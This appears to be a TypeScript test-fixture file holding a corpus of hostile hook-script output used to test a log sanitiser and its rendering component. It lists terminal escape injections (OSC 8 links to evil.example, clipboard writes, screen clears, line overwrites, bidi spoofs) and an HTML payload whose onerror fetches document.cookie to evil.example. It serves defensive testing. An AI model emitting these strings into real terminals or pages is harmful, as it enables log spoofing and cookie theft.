/**
 * The hostile output corpus (issue #815).
 *
 * Every entry is something a hook script on a source host can print, and
 * every one of them does something in a real terminal or a real browser
 * if it is passed through. It is shared by the sanitiser's own tests and
 * by the component's, so "the filter handles it" and "the rendered
 * surface is inert" are asserted against the SAME bytes — two tests that
 * each invented their own hostile string is how a class ends up covered
 * in one of them and not the other.
 *
 * Not a test file: production code never imports it, the suite does.
 * Kept here rather than under src/test/ so it sits with the filter it
 * exists to attack.
 */

import type { StepLogRecord } from "./contract";

const ESC = "\u001b";
const BEL = "\u0007";
const ST = ESC + "\\";

export interface HostileCase {
  /** What it is, in the words the failure message should use. */
  name: string;
  /** The bytes a hook wrote. */
  raw: string;
  /** What it does if nothing filters it. */
  danger: string;
  /** Substrings that MUST survive: a filter that also eats the hook's
   *  own words has made the log useless, which is its own failure. */
  keeps?: string[];
  /** Substrings that MUST NOT appear in the drawn text. */
  forbids?: string[];
}

export const HOSTILE_CASES: readonly HostileCase[] = [
  {
    name: "OSC 8 hyperlink with BEL terminator",
    raw: ESC + "]8;;https://evil.example/steal?t=1" + BEL + "click to view the backup report" + ESC + "]8;;" + BEL,
    danger: "makes the log line a clickable link to an attacker's URL",
    keeps: ["click to view the backup report"],
    forbids: ["evil.example", "https://", "]8;"]
  },
  {
    name: "OSC 8 hyperlink with ST terminator",
    raw: ESC + "]8;id=1;javascript:alert(1)" + ST + "harmless looking text" + ESC + "]8;;" + ST,
    danger: "same link, terminated the other legal way, carrying a script URL",
    keeps: ["harmless looking text"],
    forbids: ["javascript:", "alert(1)"]
  },
  {
    name: "eight-bit OSC hyperlink",
    raw: "\u009d8;;https://evil.example/x\u009cpayload",
    danger: "the C1 form of OSC, which a parser that only looks for ESC ] misses",
    keeps: ["payload"],
    forbids: ["evil.example"]
  },
  {
    name: "window title set",
    raw: ESC + "]0;backupd — all backups verified" + BEL + "nothing was verified",
    danger: "rewrites the browser tab or terminal title to a reassuring lie",
    keeps: ["nothing was verified"],
    forbids: ["all backups verified"]
  },
  {
    name: "icon and window title set",
    raw: ESC + "]1;icon" + BEL + ESC + "]2;window" + BEL + "body",
    danger: "the other two title forms",
    keeps: ["body"],
    forbids: ["icon", "window"]
  },
  {
    name: "OSC 52 clipboard write",
    raw: ESC + "]52;c;ZXZpbCBjb21tYW5k" + BEL + "copied",
    danger: "writes attacker-chosen bytes into the reader's clipboard",
    keeps: ["copied"],
    forbids: ["ZXZpbCBjb21tYW5k"]
  },
  {
    name: "window manipulation",
    raw: ESC + "[8;200;500t" + ESC + "[9;1t" + ESC + "[2t" + "resized you",
    danger: "resizes, maximises and iconifies the window",
    keeps: ["resized you"],
    forbids: ["8;200;500t", "[9;1t"]
  },
  {
    name: "window title report request",
    raw: ESC + "[21t" + ESC + "[11t" + "reported",
    danger: "asks the terminal to write the window title back into the stream",
    keeps: ["reported"],
    forbids: ["[21t"]
  },
  {
    name: "device attribute and status reports",
    raw: ESC + "[c" + ESC + "[0c" + ESC + "[6n" + ESC + "[5n" + "queried",
    danger: "makes the terminal answer back, which is output the script can read",
    keeps: ["queried"],
    forbids: ["[6n", "[0c"]
  },
  {
    name: "screen clear and cursor home",
    raw: ESC + "[2J" + ESC + "[H" + ESC + "[3J" + "cleared everything above",
    danger: "erases the log this product printed above it",
    keeps: ["cleared everything above"],
    forbids: ["[2J", "[3J"]
  },
  {
    name: "cursor up and overwrite",
    raw: "backupd: cleanup failed\n" + ESC + "[2A" + ESC + "[2K" + "backupd: cleanup completed",
    danger: "moves up over this product's own lines and rewrites them",
    keeps: ["cleanup failed", "cleanup completed"],
    forbids: ["[2A", "[2K"]
  },
  {
    name: "carriage-return overwrite",
    raw: "uploading 100% complete\rall good      ",
    danger: "repaints the line so the earlier text is never seen",
    keeps: ["uploading 100% complete", "all good"]
  },
  {
    name: "backspace overwrite",
    raw: "exit code 1\u0008\u0008\u00080",
    danger: "rubs out the digit and leaves a different one",
    keeps: ["exit code 1"]
  },
  {
    name: "SGR colour abuse",
    raw: ESC + "[31;1;4mFAILED" + ESC + "[0m" + " but the run was fine",
    danger: "paints a fake failure, or paints real text invisible",
    keeps: ["FAILED", "but the run was fine"],
    forbids: ["[31;1;4m", "[0m"]
  },
  {
    name: "hidden text via SGR conceal",
    raw: ESC + "[8mthis was meant to be invisible" + ESC + "[28m",
    danger: "hides output from the reader while leaving it in the log",
    keeps: ["this was meant to be invisible"]
  },
  {
    name: "DCS payload",
    raw: ESC + "Pq#0;2;0;0;0#0~~@@vv@@~~" + ST + "after the sixel",
    danger: "a device control string, which some terminals render as a picture",
    keeps: ["after the sixel"],
    forbids: ["#0;2;0;0;0"]
  },
  {
    name: "APC and PM payloads",
    raw: ESC + "_Gf=100,a=T;AAAA" + ST + ESC + "^private" + ST + "tail",
    danger: "application and privacy message strings, graphics protocols among them",
    keeps: ["tail"],
    forbids: ["Gf=100", "private"]
  },
  {
    name: "full reset",
    raw: ESC + "c" + "after a reset",
    danger: "resets the terminal, clearing scrollback",
    keeps: ["after a reset"]
  },
  {
    name: "alternate screen switch",
    raw: ESC + "[?1049h" + "on the alternate screen" + ESC + "[?1049l",
    danger: "moves output to a screen the reader is not looking at",
    keeps: ["on the alternate screen"],
    forbids: ["?1049h"]
  },
  {
    name: "bracketed paste and mouse tracking enable",
    raw: ESC + "[?2004h" + ESC + "[?1000h" + "input modes changed",
    danger: "turns on modes that change how later input is interpreted",
    keeps: ["input modes changed"],
    forbids: ["?2004h", "?1000h"]
  },
  {
    name: "unterminated OSC",
    raw: "before" + ESC + "]0;a title that never ends",
    danger: "swallows everything after it into a title in a terminal that waits",
    keeps: ["before"],
    forbids: ["a title that never ends"]
  },
  {
    name: "unterminated CSI",
    raw: "before" + ESC + "[38;2;255",
    danger: "leaves a parser mid-sequence so the next output is eaten",
    keeps: ["before"],
    forbids: ["38;2;255"]
  },
  {
    name: "lone ESC at the end of a chunk",
    raw: "chunk boundary" + ESC,
    danger: "the introducer of a sequence whose rest is in the next record",
    keeps: ["chunk boundary"]
  },
  {
    name: "control-character flood",
    raw: "\u0000\u0001\u0002\u0003\u0004\u0005\u0006\u0007\u000b\u000c\u000e\u000f\u007f".repeat(40) + "end of flood",
    danger: "bells, form feeds and shift-out, in bulk",
    keeps: ["end of flood"],
    forbids: ["\u0000", "\u0007", "\u007f"]
  },
  {
    name: "C1 control flood",
    raw: "\u0084\u0085\u0086\u0087\u0088\u0089\u008a\u008b\u008c\u008d\u008e\u008f" + "after C1",
    danger: "the eight-bit control range, including NEL and HTS",
    keeps: ["after C1"]
  },
  {
    name: "bidi override spoof",
    raw: "step \u202efailed\u202c and \u2066reversed\u2069",
    danger: "reverses the reading order so a word says its opposite",
    keeps: ["failed", "reversed"],
    forbids: ["\u202e", "\u2066"]
  },
  {
    name: "unicode line separator",
    raw: "one line\u2028pretending to be two\u2029and three",
    danger: "an invisible line break, so one record looks like several",
    keeps: ["one line", "pretending to be two", "and three"],
    forbids: ["\u2028", "\u2029"]
  },
  {
    name: "fake product line",
    raw: "script output\n[backupd] cleanup completed successfully\n",
    danger: "impersonates this product's own prefix in plain text",
    keeps: ["[backupd] cleanup completed successfully"]
  },
  {
    name: "html and script text",
    raw: "<img src=x onerror=\"fetch('https://evil.example/'+document.cookie)\"><script>alert(1)</script>",
    danger: "becomes live markup the moment anything assigns it as HTML rather than as text",
    keeps: ["<script>", "onerror"]
  },
  {
    name: "one line, no newline, very long",
    raw: "A".repeat(50_000) + "END",
    danger: "a line long enough to lock up layout",
    keeps: ["AAAA"]
  }
];

/** Every hostile case as one blob, in order, for the tests that only
 *  care that the whole corpus renders inertly. */
export const HOSTILE_BLOB: string = HOSTILE_CASES.map((c) => c.raw).join("\n");

/** The corpus as log records, which is how the component sees it: one
 *  case per record, alternating streams so stream identity is under the
 *  same assertions. */
export function hostileRecords(from = 1): StepLogRecord[] {
  return HOSTILE_CASES.map((hostile, index) => ({
    seq: from + index,
    stream: index % 2 === 0 ? "stdout" : "stderr",
    at: new Date(Date.UTC(2026, 8, 13, 2, 0, index)).toISOString(),
    text: hostile.raw
  }));
}
